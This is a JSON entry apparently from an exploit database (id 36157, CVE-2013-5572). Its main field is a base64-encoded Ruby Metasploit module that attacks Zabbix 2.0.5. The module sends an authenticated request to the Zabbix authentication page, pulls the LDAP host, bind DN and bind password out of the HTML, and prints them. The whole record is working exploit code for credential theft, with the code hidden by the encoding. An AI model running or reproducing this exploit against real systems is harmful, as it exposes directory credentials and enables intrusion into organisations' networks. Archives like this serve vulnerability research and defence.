{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBtb2R1bGUgcmVxdWlyZXMgTWV0YXNwbG9pdA0KIyBEYXRlOiAyNS0wOS0yMDEzDQojIEF1dGhvcjogUGFibG8gR29uesOhbGV6DQojIFZlbmRvciBIb21lcGFnZTogWmFiYml4IC0+IGh0dHA6Ly93d3cuemFiYml4LmNvbSANCiMgU29mdHdhcmUgTGluazogaHR0cDovL3d3dy56YWJiaXguY29tIA0KIyBWZXJzaW9uOiAyLjAuNQ0KIyBUZXN0ZWQgT246IExpbnV4IChVYnVudHUsIFN1c2UsIENlbnRPUykNCiMgQ1ZFOiBDVkUtMjAxMy01NTcyIGh0dHA6Ly9jdmUubWl0cmUub3JnL2NnaS1iaW4vY3ZlbmFtZS5jZ2k/bmFtZT1DVkUtMjAxMy01NTcyDQojIE1vcmUgSW5mbzogaHR0cDovL3dlYi5udmQubmlzdC5nb3Yvdmlldy92dWxuL2RldGFpbD92dWxuSWQ9Q1ZFLTIwMTMtNTU3Mg0KIyAJICAgaHR0cDovL3d3dy5lbGxhZG9kZWxtYWwuY29tLzIwMTQvMTIvY29tby1jcmVhci1lbC1tb2R1bG8tbWV0YXNwbG9pdC1wYXJhLWVsLmh0bWwNCiMgCSAgIGh0dHA6Ly9zZWNsaXN0cy5vcmcvZnVsbGRpc2Nsb3N1cmUvMjAxMy9TZXAvMTUxDQojICAgCSAgIGh0dHA6Ly93d3cuY3ZlZGV0YWlscy5jb20vY3ZlL0NWRS0yMDEzLTU1NzIvDQojIw0KDQpyZXF1aXJlICdtc2YvY29yZScNCg0KY2xhc3MgTWV0YXNwbG9pdDMgPCBNc2Y6OkF1eGlsaWFyeQ0KDQogIGluY2x1ZGUgTXNmOjpFeHBsb2l0OjpSZW1vdGU6Okh0dHBDbGllbnQNCg0KICBkZWYgaW5pdGlhbGl6ZShpbmZvID0ge30pDQogICAgc3VwZXIodXBkYXRlX2luZm8oaW5mbywNCiAgICAgICdOYW1lJyAgICAgICAgICAgPT4gJ2xkYXBfYmluZF9wYXNzd29yZCBaYWJiaXggQ1ZFLTIwMTMtNTU3MicsDQogICAgICAnRGVzY3JpcHRpb24nICAgID0+ICVxew0KICAgICAgICAgIFphYmJpeCAyLjAuNSBhbGxvd3MgcmVtb3RlIGF1dGhlbnRpY2F0ZWQgdXNlcnMgdG8gZGlzY292ZXIgdGhlIExEQVAgYmluZCBwYXNzd29yZCBieSBsZXZlcmFnaW5nIG1hbmFnZW1lbnQtY29uc29sZSBhY2Nlc3MgYW5kIHJlYWRpbmcgdGhlIGxkYXBfYmluZF9wYXNzd29yZCB2YWx1ZSBpbiB0aGUgSFRNTCBzb3VyY2UgY29kZS4NCiAgICAgIH0sDQogICAgICAnTGljZW5zZScgICAgICAgID0+IE1TRl9MSUNFTlNFLA0KICAgICAgJ0F1dGhvcicgICAgICAgICA9PiBbICdAcGFibG9nb256YWxlenBlLCBQYWJsbyBHb256YWxleicgXQ0KICAgICkpDQoNCiAgICByZWdpc3Rlcl9vcHRpb25zKFsNCiAgICAgIE9wdFN0cmluZy5uZXcoJ3pieF9zZXNzaW9uJywgW3RydWUsICdDb29raWUgemJ4X3Nlc3Npb25pZCddKSwNCgkgIE9wdFN0cmluZy5uZXcoJ1RBUkdFVFVSSScsIFt0cnVlLCAnUGF0aCBaYWJiaXggQXV0aGVudGljYXRpb24nLCcvemFiYml4L2F1dGhlbnRpY2F0aW9uLnBocCddKSwNCgkgIE9wdEludC5uZXcoJ1RJTUVPVVQnLCBbdHJ1ZSwgJ0hUVFAgcmVhZCByZXNwb25zZSB0aW1lb3V0IChzZWNvbmRzKScsIDVdKQ0KICAgIF0sIHNlbGYuY2xhc3MpDQoNCiAgZW5kDQoNCiAgZGVmIHJ1bg0KICAgIHJlcQ0KICBlbmQNCiAgZGVmIHJlcQ0KCXJlc3AgPSBzZW5kX3JlcXVlc3RfY2dpKA0KICAgICAgew0KCQknaG9zdCcgPT4gZGF0YXN0b3JlWydSSE9TVCddLA0KICAgICAgICAnbWV0aG9kJyA9PiAnUE9TVCcsDQogICAgICAgICd1cmknID0+IG5vcm1hbGl6ZV91cmkodGFyZ2V0X3VyaS5wYXRoLnRvX3MpLA0KICAgICAgICAnY29va2llJyA9PiAiemJ4X3Nlc3Npb25pZD0je2RhdGFzdG9yZVsnemJ4X3Nlc3Npb24nXX0iLA0KCQknY29udGVudC10eXBlJyA9PiAnYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkJw0KICAgICAgfSwgZGF0YXN0b3JlWydUSU1FT1VUJ10pDQoJICAgIA0KCSAgbGRhcF9ob3N0KHJlc3ApDQoJICB1c2VyX3Bhc3NEb21haW4ocmVzcCkNCgkgIHVzZXJfemFiYml4KHJlc3ApDQogIGVuZA0KICANCiAgZGVmIGxkYXBfaG9zdChyZXNwb25zZSkNCgljdXQgPSByZXNwb25zZS5ib2R5LnNwbGl0KCJsZGFwX2hvc3RcIiB2YWx1ZT1cIiIpWzFdDQoJaWYgY3V0ICE9IG5pbA0KCQlob3N0ID0gY3V0LnNwbGl0KCJcIiIpWzBdDQoJCXByaW50X2dvb2QgIkxEQVAgSG9zdCA9PiAje2hvc3R9Ig0KCWVuZA0KICBlbmQNCiAgDQogIGRlZiB1c2VyX3Bhc3NEb21haW4ocmVzcG9uc2UpDQoJY3V0ID0gcmVzcG9uc2UuYm9keS5zcGxpdCgibGRhcF9iaW5kX2RuXCIgdmFsdWU9XCIiKVsxXQ0KCWlmIGN1dCAhPSBuaWwJDQoJCXVzZXIgPSBjdXQuc3BsaXQoIlwiIilbMF0NCgkJcHJpbnRfZ29vZCAiVXNlciBEb21haW4/ID0+ICN7dXNlcn0iDQoJZW5kDQoJY3V0ID0gcmVzcG9uc2UuYm9keS5zcGxpdCgibmFtZT1cImxkYXBfYmluZF9wYXNzd29yZFwiIHZhbHVlPVwiIilbMV0NCglpZiBjdXQgIT0gbmlsDQoJCXBhc3MgPSBjdXQuc3BsaXQoIlwiIilbMF0NCgkJcHJpbnRfZ29vZCAiUGFzc3dvcmQgRG9tYWluPyA9PiAje3Bhc3N9Ig0KCWVuZA0KICBlbmQNCg0KICBkZWYgdXNlcl96YWJiaXgocmVzcG9uc2UpDQoJY3V0ID0gcmVzcG9uc2UuYm9keS5zcGxpdCgidXNlclwiIHZhbHVlPVwiIilbMV0NCglpZiBjdXQgIT0gbmlsDQoJCXVzZXIgPSBjdXQuc3BsaXQoIlwiIilbMF0NCgkJcHJpbnRfZ29vZCAiVXNlciBaYWJiaXggPT4gI3t1c2VyfSINCgllbmQNCiAgZW5kDQplbmQ=", 
    "filename": "platforms/php/webapps/36157.rb", 
    "id": "36157", 
    "cves": [
        "CVE-2013-5572"
    ]
}